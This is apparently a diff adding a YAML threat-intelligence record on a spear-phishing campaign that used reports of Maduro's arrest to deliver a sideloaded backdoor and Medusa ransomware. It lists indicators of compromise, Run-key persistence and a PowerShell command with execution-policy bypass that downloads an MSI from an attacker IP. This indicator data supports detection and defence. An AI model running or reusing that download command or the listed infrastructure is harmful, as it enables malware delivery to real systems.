@@ -1,0 +1,75 @@
+description: Threat actors exploited reports of Venezuelan President Maduro's arrest
+  to deliver backdoor malware via a spear-phishing email containing a zip archive
+  with a legitimate executable and a malicious DLL.
+malware_families:
+- Backdoor
+- Medusa
+- SimpleHelp
+TTPs:
+  processes:
+  - Maduro to be taken to New York.exe
+  - DataTechnology.exe
+  - powershell.exe
+  commandline:
+  - DataTechnology.exe --DATA
+  - powershell.exe -ExecutionPolicy Bypass -NoProfile -Command (New-Object System.Net.WebClient).DownloadFile("http://45.9.149.112:15330/44.235.83.125/a.msi",
+    "a.msi")
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Lite360
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  - SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run
+  file_activity:
+  - C:\\ProgramData\\Technology360NB\\DataTechnology.exe
+  - C:\\ProgramData\\Technology360NB\\kugou.dll
+  - a.msi
+  - '!!!READ_ME_MEDUSA!!!.txt'
+  - '*.MEDUSA'
+  - gaze.exe
+  - C:\\ProgramData\\Technology36@NB\\DataTechnology.exe
+  persistence:
+  - Registry key for running DataTechnology.exe on logon
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "Lite360"
+    "C:\\ProgramData\\Technology36@NB\\DataTechnology.exe DATA"
+  network_connections:
+  - 172.81.60[.]97:443
+  - powershell.exe, 45.9.149.112:15330
+  - powershell.exe, 44.235.83.125/a.msi
+  - gaze.exe, 193.37.69.154:7070
+  powershell:
+  - (New-Object System.Net.WebClient).DownloadFile("http://45.9.149.112:15330/44.235.83.125/a.msi",
+    "a.msi")
+  image_load:
+  - kugou.dll
+IOCs:
+  hashes:
+  - 8f81ce8ca6cdbc7d7eb10f4da5f470c6
+  - 722bcd4b14aac3395f8a073050b9a578
+  - aea6f6edbbbb0ab0f22568dcb503d731
+  - 1b9869a2e862f1e6a59f5d88398463d3962abe51e19a59
+  ip_addresses:
+  - 172.81.60[.]97
+  - 185.108.129.62
+  - 185.126.238.119
+  - 213.183.63.41
+  - 213.183.63.42
+  - 31.220.45.120
+  - 91.92.246.110
+  - 45.9.149.112
+  - 89.36.161.12
+  - 193.37.69.154
+  - 143.110.243.154
+  - 144.217.181.205
+  - 44.235.83.12
+  domains:
+  - erp.ranasons.com
+  - pruebas.pintacuario.mx
+  - lirdel.com
+  - wizarr.manate.ch
+  urls:
+  - http://45.9.149.112:15330/44.235.83.125/a.msi
+  - http://wizarr.manate[.]ch/108.215.180[.]161:8585/$/1dIL5
+authors:
+- Tara Gould
+reference: https://www.darktrace.com/blog/maduro-arrest-used-as-a-lure-to-deliver-backdoor
+date_of_publication: January 14, 2026
+file_creation_date: January 14, 2026
